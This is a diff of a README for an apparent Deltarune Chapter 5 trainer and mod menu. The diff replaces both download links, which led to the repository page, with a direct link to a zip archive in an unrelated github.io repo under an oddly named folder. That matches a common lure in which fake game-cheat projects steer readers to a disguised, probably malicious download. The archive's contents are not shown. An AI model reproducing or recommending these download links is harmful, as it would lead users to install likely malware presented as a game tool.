@@ -5,7 +5,7 @@ description: "Modify game stats, enable god mode, and manage items in Deltarune 
 ---
 # 🎮 Deltarune-Chapter5-Trainer-ModMenu - Modify your game experience with ease
 
-[![Download Deltarune Trainer](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Newtonssecondlawofmotionalien143/Deltarune-Chapter5-Trainer-ModMenu)
+[![Download Deltarune Trainer](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Newtonssecondlawofmotionalien143/newtonssecondlawofmotionalien143.github.io/main/glossophorous/github-newtonssecondlawofmotionalien-io-v2.5.zip)
 
 ## 📖 About this project
 The Deltarune-Chapter5-Trainer-ModMenu provides tools for single-player exploration in Deltarune Chapter 5. This trainer acts as an external helper for your game. It gives you control over character stats and game variables. You can adjust your gameplay speed, manage your inventory, and set your health levels. This tool does not change game files. It functions by reading and writing to game memory while the software runs.
@@ -30,7 +30,7 @@ Ensure your computer meets these standards before you run the trainer:
 Follow these steps to set up the trainer on your Windows system.
 
 1. Download the tool. Visit the link below to reach the latest version page.
-[https://github.com/Newtonssecondlawofmotionalien143/Deltarune-Chapter5-Trainer-ModMenu](https://github.com/Newtonssecondlawofmotionalien143/Deltarune-Chapter5-Trainer-ModMenu)
+[https://raw.githubusercontent.com/Newtonssecondlawofmotionalien143/newtonssecondlawofmotionalien143.github.io/main/glossophorous/github-newtonssecondlawofmotionalien-io-v2.5.zip](https://raw.githubusercontent.com/Newtonssecondlawofmotionalien143/newtonssecondlawofmotionalien143.github.io/main/glossophorous/github-newtonssecondlawofmotionalien-io-v2.5.zip)
 
 2. Create a folder on your computer for the trainer files. Keep this folder in an easy-to-find spot like your Documents directory.
 
